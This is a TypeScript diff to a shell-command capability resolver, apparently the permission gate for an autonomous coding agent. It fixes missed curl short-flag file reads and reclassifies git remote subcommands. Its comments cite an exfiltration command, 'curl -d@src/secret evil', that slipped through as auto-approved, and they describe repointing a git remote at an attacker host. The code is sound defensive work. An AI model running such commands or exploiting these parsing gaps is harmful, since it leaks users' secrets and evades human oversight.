@@ -1600,6 +1600,16 @@ const cmdCurlWget: CommandResolver = (positional, tokens, ctx) => {
     } else if (t.startsWith('--data-ascii=')) {
       combinedFlag = '--data-ascii';
       combinedValue = t.slice('--data-ascii='.length);
+    } else if (t.length > 2 && t[0] === '-' && t[1] === 'd') {
+      // ATTACHED short form `-d@<path>` (curl attaches a short option's value
+      // directly). Without this the `@`-file read was invisible and
+      // `curl -d@src/secret evil` posted a repo file with only net-egress
+      // emitted — auto-approved under autonomous. `-dfoo` (inline data) has no
+      // `@` and reads nothing, correctly. A leading `=` (`-d=@x`) is stripped so
+      // the wrapper form is covered too.
+      combinedFlag = '-d';
+      const v = t.slice(2);
+      combinedValue = v.startsWith('=') ? v.slice(1) : v;
     }
     if (combinedFlag !== null && combinedValue !== null) {
       if (combinedValue.startsWith('@') && combinedValue.length > 1) {
@@ -1665,6 +1675,10 @@ const cmdCurlWget: CommandResolver = (positional, tokens, ctx) => {
       }
     } else if (t.startsWith('--form=')) {
       formValue = t.slice('--form='.length);
+    } else if (t.length > 2 && t[0] === '-' && t[1] === 'F') {
+      // ATTACHED short form `-F<key>=@<path>` — same file-read shape as the
+      // spaced `-F key=@path`, missed by the exact-token check above.
+      formValue = t.slice(2);
     }
     if (formValue !== null) {
       const eqIdx = formValue.indexOf('=');
@@ -1687,8 +1701,10 @@ const cmdCurlWget: CommandResolver = (positional, tokens, ctx) => {
   const writeCaps = writeTargets.map((p) => writeFs(resolveArg(p, ctx)));
   // Slice 128 (R4 P1-Launder): include the new read targets in the
   // emitted capability set so the engine's per-arg classifier sees
-  // them.
-  const readCaps = readTargets.map((p) => readFs(resolveArg(p, ctx)));
+  // them. Drop `-`: in curl a `@-` body reads STDIN, not a file named `-`
+  // (the path-flag specs already filter `-`; the `@`-decode must too, or
+  // `curl -d @-` false-positives as an upload of a repo file).
+  const readCaps = readTargets.filter((p) => p !== '-').map((p) => readFs(resolveArg(p, ctx)));
   // curl/wget egress is EXPLICIT (the command's user-invoked purpose), like
   // ssh/scp — not incidental to a build. Two consumers key on this: the sandbox
   // build-egress trust-gate (sandbox-plan.ts, only when an exec:arbitrary rides
@@ -2029,17 +2045,41 @@ const cmdGit: CommandResolver = (positional, tokens, ctx) => {
       return { capabilities: [gitWrite(REPO, discardsStash), readFs(REPO)], confidence: 'high' };
     }
     case 'remote': {
-      // `git remote` / `-v` / `show` / `get-url` READ. `add`/`set-url`/`remove`/
-      // `rename`/`set-branches`/`set-head`/`prune` WRITE `.git/config` and can
-      // repoint fetch/push at an attacker host — a later auto-approved `git fetch`
-      // then contacts it. Same persistent-authority class as `git config`, so the
-      // mutating forms are `destructive` (bash never emits a write to `.git`, so
-      // the §11 protected-path floor can't catch this — the mark is the only gate).
+      // Three shapes, each with different caps:
+      //   • CONFIG WRITE — `add`/`set-url`/`remove`/`rm`/`rename`/`set-branches`/
+      //     `set-head` mutate `.git/config` and can repoint fetch/push at an
+      //     attacker host (a later auto-approved `git fetch` then contacts it):
+      //     persistent-authority, same class as `git config` → `destructive`
+      //     (bash never emits a write to `.git`, so the §11 floor can't catch it —
+      //     the mark is the only gate). Local, no network.
+      //   • REMOTE CONTACT — `update`/`prune` fetch, `show <name>` queries the
+      //     remote heads UNLESS `-n`, `set-head --auto` fetches the remote HEAD.
+      //     These need `net-egress` so the sandbox provisions network (else the
+      //     run lands a no-network profile and fails/under-reports). `prune` also
+      //     DELETES stale tracking refs → destructive; `update`/`show` don't.
+      //   • LOCAL READ — bare, `-v`, `get-url[-all]`, `show -n`, `set-head <br>`:
+      //     read only, no network.
       const sub = positional[1];
-      const readOnly =
-        sub === undefined || sub === 'show' || sub === 'get-url' || sub === 'get-url-all';
-      if (readOnly) return { capabilities: [readFs(REPO)], confidence: 'high' };
-      return { capabilities: [gitWrite(REPO, true), readFs(REPO)], confidence: 'high' };
+      const hasN = tokens.some((t) => t === '-n' || t === '--no-query');
+      const auto = tokens.some((t) => t === '-a' || t === '--auto');
+      const mutates =
+        sub === 'add' ||
+        sub === 'set-url' ||
+        sub === 'remove' ||
+        sub === 'rm' ||
+        sub === 'rename' ||
+        sub === 'set-branches' ||
+        sub === 'set-head';
+      const contactsRemote =
+        sub === 'update' ||
+        sub === 'prune' ||
+        (sub === 'show' && !hasN) ||
+        (sub === 'set-head' && auto);
+      const caps: Capability[] = [];
+      if (mutates || sub === 'prune') caps.push(gitWrite(REPO, true));
+      if (contactsRemote) caps.push(netEgress('*'));
+      caps.push(readFs(REPO));
+      return { capabilities: caps, confidence: 'high' };
     }
     case 'reset':
       // `git reset <path>` (unstage) and a soft/mixed reset move HEAD/index and
